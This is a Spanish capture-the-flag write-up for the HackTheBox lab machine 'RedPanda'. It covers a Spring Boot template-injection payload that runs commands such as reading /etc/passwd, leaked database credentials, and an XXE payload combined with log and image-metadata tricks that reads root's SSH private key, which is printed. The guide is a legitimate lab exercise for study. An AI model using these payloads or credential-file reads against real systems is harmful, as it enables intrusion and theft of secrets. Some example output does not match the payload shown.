# Máquina "RedPanda" de HackTheBox

## Características

- Linux
- Easy
- SSTI
- Bypassing de restricción de caracteres especiales
- Creación de un script de Python para automatizar la inyección Java (RCE)
- Creación de un script bash para monitoreo de procesos con usuario incluido
- Abuso de archivo de log + metadatos de imagen + XML (XXE) [Escalada de Privilegios]

## Útil en

- eWPT
- eWPTXv2
- OSWE
- OSCP

**IP:** 10.10.11.170

## Reconocimiento

### Escaneo de Puertos

Escaneo inicial de puertos:

```bash
nmap -p- --min-rate 10000 10.10.11.170
```

**Resultados:**

```
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Escaneo detallado de servicios:

```bash
nmap -p 22,8080 -sCV 10.10.11.170
```

**Resultados:**

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 21 Nov 2022 19:58:58 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
...[snip]...
_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
...[snip]...
SF:l>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El codename buscado es Ubuntu Focal 20.04. El título indica que el sitio está construido sobre Spring Boot.

![Sitio web en puerto 8080](/secciones/posts/imagenes/redpanda/redpanda8080.png)

### Enumeración de Directorios

A través de la enumeración de archivos, encontramos una página de estadísticas:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -of md -o ffuz.txt -t 60 -u http://10.10.11.170:8080/FUZZ
```

**Resultado:**

```
stats                   [Status: 200, Size: 987, Words: 200, Lines: 33]
```

En esta página aparecen las estadísticas de los autores woodenk y damian. Se puede obtener y exportar en formato XML.

![Página de estadísticas](/secciones/posts/imagenes/redpanda/status.png)

## Explotación

### Identificación de SSTI

Finalmente, el panda Greg aparece si no se inserta ninguna entrada, indicando que el motor de búsqueda podría ser vulnerable a ataques de inyección.

Después de probar el motor de búsqueda usando la lista de palabras `special-chars.txt` de SecLists y codificando caracteres URL, se obtienen los siguientes resultados:

![Prueba de caracteres especiales](/secciones/posts/imagenes/redpanda/seclist.png)

Dado que los caracteres `){}\%` produjeron errores cuando se enviaron al servidor, y los caracteres `~$_` están prohibidos para el motor, podría ser vulnerable a SSTI.

Para verificar esto, se utilizó la siguiente carga útil `*{7*7}` (codificando caracteres antes de ejecutar el intruso). Como resultado, parece que el código dentro de `*{<CODE>}` está siendo ejecutado.

![Ejecución de código](/secciones/posts/imagenes/redpanda/exec.png)

### Inyección SSTI Java

Dado que Spring Boot está hecho con Java, se necesitan cargas útiles SSTI Java. Estas cargas útiles se pueden encontrar en PayloadsAllTheThings. Usaremos la siguiente:

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

Debido a que esta carga útil requiere codificar cada carácter que se ejecutará, para facilitar el trabajo se utiliza la herramienta [SSTI-PAYLOAD](https://github.com/vladko312/ssti-payload).

**Nota:** Se modificó el script para retornar siempre `*{` en lugar de `${`.

```bash
python ssti-payload.py 

Command ==> whoami

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}
```

### Enumeración Manual

Debido a que no se puede obtener un shell inverso, la enumeración manual de la máquina se debe realizar mediante el formulario web.

Examinando el código fuente de la aplicación:

```bash
# cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
```

Dentro del código fuente de búsqueda de Panda, encontramos credenciales de base de datos:

```java
public ArrayList searchPanda(String query) {
    Connection conn = null;
    PreparedStatement stmt = null;
    ArrayList<ArrayList> pandas = new ArrayList();
    try {
        Class.forName("com.mysql.cj.jdbc.Driver");
        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
        stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
        stmt.setString(1, "%" + query + "%");
        ResultSet rs = stmt.executeQuery();
        while(rs.next()){
            ArrayList<String> panda = new ArrayList<String>();
            panda.add(rs.getString("name"));
            panda.add(rs.getString("bio"));
            panda.add(rs.getString("imgloc"));
            panda.add(rs.getString("author"));
            pandas.add(panda);
        }
    }catch(Exception e){ System.out.println(e);}
    return pandas;
}
```

### Acceso SSH

Accedemos a la máquina a través de SSH y buscamos la flag de usuario:

```bash
ssh woodenk@10.10.11.170
# Password: RedPandazRule

woodenk@redpanda:~$ cat user.txt 
[CENSORED]
```

## Escalada de Privilegios

### Análisis de Procesos

Usando pspy podemos ver que cada dos minutos el archivo Java `final-1.0-jar-with-dependencies.jar` se está ejecutando como root:

```
2022/07/31 17:22:01 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/07/31 17:22:01 CMD: UID=0    PID=3337   | /usr/sbin/CRON -f 
2022/07/31 17:22:01 CMD: UID=0    PID=3338   | /bin/sh -c /root/run_credits.sh 
2022/07/31 17:22:01 CMD: UID=0    PID=3339   | /bin/sh /root/run_credits.sh 
2022/07/31 17:22:01 CMD: UID=0    PID=3340   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
```

### Análisis del Código Java

Este archivo de aplicación Java tiene el código fuente ubicado en `/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java`.

A partir de la función principal, podemos ver que lee el archivo de registro `/opt/panda_search/redpanda.log`, analiza algunos datos y luego lee un archivo XML:

```java
public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
    File log_fd = new File("/opt/panda_search/redpanda.log");
    Scanner log_reader = new Scanner(log_fd);
    while (log_reader.hasNextLine()) {
        String line = log_reader.nextLine();
        if (!isImage(line))
            continue; 
        Map parsed_data = parseLog(line);
        System.out.println(parsed_data.get("uri"));
        String artist = getArtist(parsed_data.get("uri").toString());
        System.out.println("Artist: " + artist);
        String xmlPath = "/credits/" + artist + "_creds.xml";
        addViewTo(xmlPath, parsed_data.get("uri").toString());
    } 
}
```

### Vulnerabilidad en el Parser de Logs

La función divide una línea de registro en una cadena usando `||` como separador. Dado que el atacante tiene control sobre el parámetro HTTP User-Agent, el valor `uri` se puede sobrescribir:

```bash
# cat redpanda.log 
# 200||10.10.14.40||Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0||/search
```

```java
public static Map parseLog(String line) {
    String[] strings = line.split("\\|\\|");
    Map map = new HashMap<>();
    map.put("status_code", Integer.parseInt(strings[0]));
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    return map;
}
```

### Función getArtist

El valor `uri` se utiliza en la función `getArtist`, agregando el valor a una ruta de imagen para leer el atributo `Artist` de los metadatos:

```java
public static String getArtist(String uri) throws IOException, JpegProcessingException {
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for(Directory dir : metadata.getDirectories()) {
        for(Tag tag : dir.getTags()) {
            if(tag.getTagName() == "Artist") {
                return tag.getDescription();
            }
        }
    }
    return "N/A";
}
```

### Función addViewTo y Vulnerabilidad XXE

Finalmente, el valor `artist` se agrega a otra ruta, que se utiliza en la función `addViewTo`. Esta función lee el archivo, actualiza el contador de cada vista de imagen y luego sobrescribe el archivo con los nuevos valores:

```java
public static void addViewTo(String path, String uri) throws JDOMException, IOException {
    SAXBuilder saxBuilder = new SAXBuilder();
    XMLOutputter xmlOutput = new XMLOutputter();
    xmlOutput.setFormat(Format.getPrettyFormat());
    
    File fd = new File(path);
    Document doc = saxBuilder.build(fd);
    Element rootElement = doc.getRootElement();
    
    for(Element el: rootElement.getChildren()) {
        if(el.getName() == "image") {
            if(el.getChild("uri").getText().equals(uri)) {
                Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                System.out.println("Total views:" + Integer.toString(totalviews));
                rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                Integer views = Integer.parseInt(el.getChild("views").getText());
                el.getChild("views").setText(Integer.toString(views + 1));
            }
        }
    }
    BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
    xmlOutput.output(doc, writer);
}
```

### Explotación XXE

Dado que no hay medidas para prevenir XXE y tenemos control sobre los parámetros `user_agent`, `uri`, `artist` y `xmlPath`, podemos crear un archivo XML con XXE para leer la clave privada de root.

**Paso 1:** Obtener una imagen y actualizar sus metadatos:

```bash
wget http://10.10.11.170:8080/img/greg.jpg
exiftool -Artist="../tmp/marmeus" greg.jpg
```

**Paso 2:** Editar un archivo XML de estadísticas para agregar la carga útil XXE:

```bash
wget 'http://10.10.11.170:8080/export.xml?author=woodenk' -O marmeus_creds.xml
```

Editar el archivo para que se vea así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <marmeu>&ent;</marmeu>
    <views>2</views>
    [...]
```

**Paso 3:** Subir todos los archivos y enviar una solicitud con el agente de usuario malicioso:

```bash
scp marmeus_creds.xml greg.jpg woodenk@10.10.11.170:/tmp/
curl http://10.10.11.170:8080/ -A 'Firefox||/../../../../../../../tmp/greg.jpg'
```

### Obtención de la Clave Privada

Después de dos minutos, se ejecutará el script y se modificará el XML agregando la clave privada del root:

```bash
woodenk@redpanda:/tmp$ cat marmeus_creds.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <hello>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ                                   
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</hello>
    [...]
```

### Acceso como Root

Finalmente, es posible acceder a la máquina como root, así que buscamos la flag:

```bash
ssh root@10.10.11.170 -i id_rsa
root@redpanda:~# cat root.txt
[CENSORED]
```

## Nota

Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También, si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.